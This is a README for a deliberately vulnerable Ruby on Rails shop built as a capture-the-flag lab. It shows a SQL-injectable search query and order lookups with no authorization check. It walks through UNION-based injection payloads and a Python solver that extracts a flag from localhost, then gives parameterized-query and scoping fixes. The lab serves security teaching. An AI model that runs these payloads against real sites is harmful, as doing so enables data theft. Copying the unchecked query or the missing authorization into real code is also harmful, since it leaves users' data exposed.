# Vulnerable Cart - Security Challenge

A deliberately vulnerable Ruby on Rails e-commerce application designed for security testing and education. This application contains multiple security vulnerabilities including SQL injection and Insecure Direct Object References (IDOR).

## 🚨 Warning

**This application is intentionally vulnerable and should NEVER be deployed in production or on public networks. It is designed solely for educational purposes and security testing in controlled environments.**

## 📋 Table of Contents

- [Overview](#overview)
- [Vulnerabilities](#vulnerabilities)
- [Setup Instructions](#setup-instructions)
- [Folder Structure](#folder-structure)
- [Exploitation Guide](#exploitation-guide)
- [Solution Analysis](#solution-analysis)
- [Mitigation Strategies](#mitigation-strategies)

## 🎯 Overview

Vulnerable Cart is a simple e-commerce application built with Ruby on Rails 7.1.3 that allows users to:
- Browse products
- Search for products
- Create and view orders
- Manage product inventory

The application intentionally contains security flaws to demonstrate common web application vulnerabilities and their exploitation techniques.

## 🔓 Vulnerabilities

### 1. SQL Injection (SQLi)
**Location:** `app/controllers/products_controller.rb:12`

The product search functionality is vulnerable to SQL injection:

```ruby
def search
  query = params[:query]
  @products = Product.find_by_sql("SELECT * FROM products WHERE name LIKE '%#{query}%'")
  # Vulnerable: Direct string interpolation without sanitization
end
```

**Impact:** 
- Database enumeration
- Data extraction
- Potential data modification/deletion

### 2. Insecure Direct Object References (IDOR)
**Location:** `app/controllers/orders_controller.rb:7-8, 12-13`

The orders controller lacks proper authorization:

```ruby
def show
  @order = Order.find(params[:id])  # No authorization check
end

def update
  @order = Order.find(params[:id])  # No authorization check
end
```

**Impact:**
- Access to other users' orders
- Unauthorized order modifications

## 🚀 Setup Instructions

### Prerequisites
- Ruby 3.3.3
- Rails 7.1.3+
- SQLite3
- Python 3.x (for the solver script)

### Installation

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd vulnerable-cart
   ```

2. **Install Ruby dependencies:**
   ```bash
   bundle install
   ```

3. **Setup the database:**
   ```bash
   rails db:create
   rails db:migrate
   rails db:seed
   ```

4. **Start the Rails server:**
   ```bash
   rails server
   ```
   The application will be available at `http://localhost:3000`

5. **Setup the Python solver environment:**
   ```bash
   cd solver
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   pip install -r requirements.txt
   ```

## 📁 Folder Structure

```
vulnerable-cart/
├── app/                          # Main application code
│   ├── controllers/              # Request handlers
│   │   ├── products_controller.rb    # Product management (contains SQLi)
│   │   ├── orders_controller.rb      # Order management (contains IDOR)
│   │   └── application_controller.rb # Base controller
│   ├── models/                   # Data models
│   │   ├── product.rb               # Product model
│   │   ├── order.rb                 # Order model
│   │   └── this_is_very_secret_long_table_name.rb  # Secret table (target)
│   └── views/                    # HTML templates
│       ├── products/                # Product views
│       └── orders/                  # Order views
├── config/                       # Application configuration
│   ├── routes.rb                    # URL routing
│   ├── database.yml                 # Database configuration
│   └── application.rb               # Main app config
├── db/                          # Database files
│   ├── migrate/                     # Database migrations
│   ├── schema.rb                    # Database schema
│   ├── seeds.rb                     # Sample data (includes flag)
│   └── development.sqlite3          # SQLite database file
├── solver/                      # Exploitation scripts
│   ├── solve.py                     # Python exploitation script
│   ├── requirements.txt             # Python dependencies
│   └── venv/                        # Python virtual environment
├── Gemfile                      # Ruby dependencies
└── README.md                    # This file
```

### Key Files Explained

- **`app/controllers/products_controller.rb`**: Contains the vulnerable search function with SQL injection
- **`app/models/this_is_very_secret_long_table_name.rb`**: Hidden model containing the flag
- **`db/seeds.rb`**: Creates sample data including the secret flag
- **`solver/solve.py`**: Automated exploitation script demonstrating SQLi techniques

## 🎯 Exploitation Guide

### Manual SQL Injection Testing

1. **Basic SQLi Detection:**
   ```
   http://localhost:3000/products/search?query=widget'
   ```

2. **Column Count Enumeration:**
   ```
   http://localhost:3000/products/search?query=widget' ORDER BY 7; --
   ```

3. **Union-based Data Extraction:**
   ```
   http://localhost:3000/products/search?query=widget' UNION ALL SELECT 1,2,3,4,'test',6,7; --
   ```

4. **Database Schema Discovery:**
   ```
   http://localhost:3000/products/search?query=widget' UNION ALL SELECT 1,sql,3,4,'test',6,7 FROM sqlite_schema; --
   ```

5. **Flag Extraction:**
   ```
   http://localhost:3000/products/search?query=widget' UNION ALL SELECT 1,content,3,4,'test',6,7 FROM this_is_very_secret_long_table_names; --
   ```

### IDOR Testing

1. **Access other users' orders:**
   ```
   http://localhost:3000/orders/1  # Try different order IDs
   ```

## 🔍 Solution Analysis

The `solver/solve.py` script demonstrates an automated approach to exploiting the SQL injection vulnerability:

### Script Breakdown

```python
import requests

BASE_URL = "http://localhost:3000"
session = requests.Session()

# 1. Column enumeration payload
payload_1 = "widget' ORDER BY 7; --"

# 2. Union-based injection to test column structure
payload_2 = "widget' UNION ALL SELECT 1,2,3,4,'https://picsum.photos/seed/105/150',6,7; --"

# 3. Database version detection
payload_3 = "widget' UNION ALL SELECT sqlite_version(),sqlite_version(),3,4,'https://picsum.photos/seed/105/150',6,7; --"

# 4. Schema enumeration
payload_4 = "widget' UNION ALL SELECT 1,sql,3,4,'https://picsum.photos/seed/105/150',6,7 FROM sqlite_schema; --"

# 5. Flag extraction from secret table
payload_5 = "widget') UNION ALL SELECT 1,content,3,4,'https://picsum.photos/seed/105/150',6,7 FROM this_is_very_secret_long_table_names; --"
```

### Exploitation Steps

1. **Discovery**: Test for SQL injection by breaking the query syntax
2. **Enumeration**: Determine the number of columns using `ORDER BY`
3. **Union Testing**: Verify union compatibility and column types
4. **Schema Discovery**: Extract table and column information from `sqlite_schema`
5. **Data Extraction**: Retrieve the flag from the hidden table

### Target Flag

The application contains a hidden flag in the `this_is_very_secret_long_table_names` table:
```
Flag{C0ngr4ts_on_y0ur_f1rst_Rails_challenge}
```

## 🛡️ Mitigation Strategies

### SQL Injection Prevention

**Current vulnerable code:**
```ruby
@products = Product.find_by_sql("SELECT * FROM products WHERE name LIKE '%#{query}%'")
```

**Secure alternatives:**

1. **Using ActiveRecord ORM (Recommended):**
   ```ruby
   @products = Product.where("name LIKE ?", "%#{query}%")
   ```

2. **With proper sanitization:**
   ```ruby
   sanitized_query = Product.sanitize_sql_like(query)
   @products = Product.where("name LIKE ?", "%#{sanitized_query}%")
   ```

3. **Using parameterized queries:**
   ```ruby
   @products = Product.find_by_sql([
     "SELECT * FROM products WHERE name LIKE ?", 
     "%#{query}%"
   ])
   ```

### IDOR Prevention

**Add authorization checks:**
```ruby
def show
  @order = current_user.orders.find(params[:id])  # Scope to current user
end

def update
  @order = current_user.orders.find(params[:id])  # Scope to current user
  # ... rest of the method
end
```

### Additional Security Measures

1. **Input Validation**: Validate and sanitize all user inputs
2. **Parameterized Queries**: Always use parameterized queries for database operations
3. **Authorization**: Implement proper access controls for all resources
4. **Error Handling**: Don't expose sensitive information in error messages
5. **Security Headers**: Implement appropriate security headers
6. **Regular Updates**: Keep dependencies and frameworks up to date

## 🎓 Educational Purpose

This application serves as a practical example for:
- Understanding common web application vulnerabilities
- Learning secure coding practices in Ruby on Rails
- Practicing penetration testing techniques
- Demonstrating the importance of input validation and authorization

## ⚖️ Legal Notice

This software is provided for educational and research purposes only. Users are responsible for ensuring they have proper authorization before testing these techniques on any systems. Unauthorized access to computer systems is illegal and unethical.

---

**Remember**: The best way to secure applications is to understand how they can be attacked. Use this knowledge responsibly to build more secure systems.
